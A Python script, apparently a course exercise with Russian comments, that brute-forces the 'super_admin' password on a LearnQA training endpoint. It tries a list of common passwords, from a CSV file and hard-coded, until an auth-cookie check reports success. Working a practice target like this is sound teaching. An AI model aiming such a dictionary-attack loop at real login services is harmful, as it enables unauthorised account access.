import requests
import csv

# Его необходимо вызывать POST-запросом с двумя параметрами: login и password
# Если вызвать метод без поля login или указать несуществующий login, метод вернет 500
# Если login указан и существует, метод вернет нам авторизационную cookie с названием auth_cookie и каким-то значением.
url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'

# метод, который проверяет правильность нашей авторизованной cookie
# Если вызвать его без cookie с именем auth_cookie или с cookie, у которой выставлено "неправильное" значение,
# метод вернет фразу "You are NOT authorized".
# Если значение cookie “правильное”, метод вернет: “You are authorized”
url_2 = ' https://playground.learnqa.ru/ajax/api/check_auth_cookie'


# 1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

# 2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
# Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
# В этом случае берем следующий пароль и все заново.
# Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.

# через csv
with open('passwords.csv', newline='') as csvfile:
    reader = csv.DictReader(csvfile)
    passwords = set()
    for row in reader:
        passwords.add(row['password'])


for i in passwords:
    data = {'login': 'super_admin', 'password': i}
    response_cookie = requests.post(url, data=data)
    cookie = dict(response_cookie.cookies)
    response_check = requests.post(url_2, cookies=cookie)
    if 'You are authorized' == response_check.text:
        print(f'Password - {i}; message - {response_check.text}')
        break

# через список
pass_list = ['password', 'password', 123456, 123456, 123456, 123456, 123456, 123456, 123456,
             123456, 123456, 'password', 'password', 'password', 'password', 'password', 'password', 123456789,
             12345678, 12345678, 12345678, 12345, 12345678, 12345, 12345678, 123456789, 'qwerty',
             'qwerty', 'abc123', 'qwerty', 12345678, 'qwerty', 12345678, 'qwerty', 12345678, 'password',
             'abc123', 'qwerty', 'abc123', 'qwerty', 12345, 'football', 12345, 12345, 1234567,
             'monkey', 'monkey', 123456789, 123456789, 123456789, 'qwerty', 123456789, 111111, 12345678,
             1234567, 'letmein', 111111, 1234, 'football', 1234567890, 'letmein', 1234567, 12345,
             'letmein', 'dragon', 1234567, 'baseball', 1234, 1234567, 1234567, 'sunshine', 'iloveyou',
             'trustno1', 111111, 'iloveyou', 'dragon', 1234567, 'princess', 'football', 'qwerty', 111111,
             'dragon', 'baseball', 'adobe123', 'football', 'baseball', 1234, 'iloveyou', 'iloveyou', 123123,
             'baseball', 'iloveyou', 123123, 1234567, 'welcome', 'login', 'admin', 'princess', 'abc123',
             111111, 'trustno1', 'admin', 'monkey', 1234567890, 'welcome', 'welcome', 'admin', 'qwerty123',
             'iloveyou', 1234567, 1234567890, 'letmein', 'abc123', 'solo', 'monkey', 'welcome', '1q2w3e4r',
             'master', 'sunshine', 'letmein', 'abc123', 111111, 'abc123', 'login', 666666, 'admin',
             'sunshine', 'master', 'photoshop', 111111, '1qaz2wsx', 'admin', 'abc123', 'abc123', 'qwertyuiop',
             'ashley', 123123, 1234, 'mustang', 'dragon', 121212, 'starwars', 'football', 654321,
             'bailey', 'welcome', 'monkey', 'access', 'master', 'flower', 123123, 123123, 555555,
             'passw0rd', 'shadow', 'shadow', 'shadow', 'monkey', 'passw0rd', 'dragon', 'monkey', 'lovely',
             'shadow', 'ashley', 'sunshine', 'master', 'letmein', 'dragon', 'passw0rd', 654321, 7777777,
             123123, 'football', 12345, 'michael', 'login', 'sunshine', 'master', '!@#$%^&*', 'welcome',
             654321, 'jesus', 'password1', 'superman', 'princess', 'master', 'hello', 'charlie', 888888,
             'superman', 'michael', 'princess', 696969, 'qwertyuiop', 'hottie', 'freedom', 'aa123456', 'princess',
             'qazwsx', 'ninja', 'azerty', 123123, 'solo', 'loveme', 'whatever', 'donald', 'dragon',
             'michael', 'mustang', 'trustno1', 'batman', 'passw0rd', 'zaq1zaq1', 'qazwsx', 'password1', 'password1',
             'Football', 'password1', 000000, 'trustno1', 'starwars', 'password1', 'trustno1', 'qwerty123', '123qwe']

for i in pass_list:
    data = {'login': 'super_admin', 'password': i}
    response_cookie = requests.post(url, data=data)
    cookie = dict(response_cookie.cookies)
    response_check = requests.post(url_2, cookies=cookie)
    if 'You are authorized' == response_check.text:
        print(f'Password - {i}; message - {response_check.text}')
        break
